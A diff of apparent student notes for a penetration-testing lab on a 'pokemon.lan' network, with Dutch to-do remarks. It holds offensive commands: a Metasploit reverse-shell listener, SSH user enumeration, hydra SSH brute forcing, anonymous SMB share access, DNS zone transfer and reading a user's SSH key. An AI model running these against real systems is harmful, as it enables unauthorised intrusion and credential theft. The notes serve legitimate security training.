@@ -3,8 +3,6 @@
 #!/bin/bash
 msfconsole -q -x "use exploit/multi/handler;set PAYLOAD <PAYLOAD>;set LHOST <LHOST>;set LPORT <LPORT>;exploit -j"
 
-
-
 msfconsole
 use auxiliary/scanner/ssh/ssh_enumusers
 set RHOSTS 192.168.52.60
@@ -22,23 +20,6 @@ run
 hydra:
 hydra -L <usernames_file> -P <passwords_file> <target_ip> ssh
 
-## docent meneer voortonen spoilers 1
-
-Who are the hardware vendors of the live systems on this network?
-=> nmap -sn iprange (mac addres finder)
-Who is the DNS server of the pokemon.lan environment?
-=> cat /etc/resolv.conf
-Is it vulnerable to a DNS zone transfer attack?
-=> dig axfr pokemon.lan @192.168.52.4(dnsserveripaddres see /etc/resolv.conf)
-Did you find any vulnerable fileshares on the environment?
-=> nmap -p 139,445 --open pokemon.lan.lst (smb fileshare)
-=> check login with smbclient
-=> smbclient -L \\{ip}\\ -U anonymous
-=> smbclient \\\\{ip}\\sharename -U anonymous
-=> dir
-=> get x.txt
-
-done until here
 
 Is there a Minecraft server running on the environment, and is it really Minecraft?
 => nmap -p 25565 -il pokemon.lan.lst --open -sV
@@ -64,3 +45,11 @@ When you gained access on Alakazam, as which user are you accessing the machine?
 => sudo l
 => sudo cat /home/ash/.ssh/id_rsa.pub
 
+
+
+touch on or off option
+Findings toevoege aan report.txt
+Ssh brute toevoege
+Wget van webpages
+List van ports en services
+Zenmap ofz toevoege
